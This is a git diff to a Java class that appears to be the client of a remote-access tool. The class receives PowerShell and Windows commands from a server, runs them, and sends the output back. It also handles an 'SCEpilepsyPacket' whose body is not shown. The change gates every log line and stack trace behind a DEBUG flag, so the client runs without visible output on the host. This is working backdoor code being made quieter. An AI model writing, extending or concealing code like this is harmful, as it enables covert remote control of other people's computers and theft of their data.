@@ -9,6 +9,8 @@ import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 
+import static me.kutuzov.client.KutuzovEntry.DEBUG;
+
 public class KutuzovWinPackets {
     private static PowerShell powerShell;
     public static void init() { powerShell = PowerShell.openSession(); }
@@ -18,7 +20,8 @@ public class KutuzovWinPackets {
         if(packet instanceof SCPowershellCommandPacket) {
             new Thread(() -> {
                 SCPowershellCommandPacket p = (SCPowershellCommandPacket)packet;
-                System.out.println("[S->C] " + p.getClass().getSimpleName() + ": " + p.command);
+                if(DEBUG)
+                    System.out.println("[S->C] " + p.getClass().getSimpleName() + ": " + p.command);
                 String command = p.command;
                 String result = "";
 
@@ -34,14 +37,16 @@ public class KutuzovWinPackets {
                         result += line + "\n";
                     reader.close();
                 } catch (Exception e) {
-                    e.printStackTrace();
+                    if(DEBUG)e.printStackTrace();
                 }
 
-                System.out.println("[C->S] CSPowershellResponsePacket init: " + result);
+                if(DEBUG)
+                    System.out.println("[C->S] CSPowershellResponsePacket init: " + result);
                 try {
                     oos.writeObject(new CSPowershellResponsePacket(result));
-                    System.out.println("[C->S] CSPowershellResponsePacket sent");
-                } catch (Exception e) { e.printStackTrace(); }
+                    if(DEBUG)
+                        System.out.println("[C->S] CSPowershellResponsePacket sent");
+                } catch (Exception e) { if(DEBUG) e.printStackTrace(); }
             }).start();
         } else if(packet instanceof SCEpilepsyPacket) {
             new Thread(() -> {
@@ -75,7 +80,7 @@ public class KutuzovWinPackets {
 
                 try {
                     oos.writeObject(new CSWinCommandResponsePacket(result));
-                } catch (Exception e) { e.printStackTrace(); }
+                } catch (Exception e) { if(DEBUG)e.printStackTrace(); }
             }).start();
         }
     }
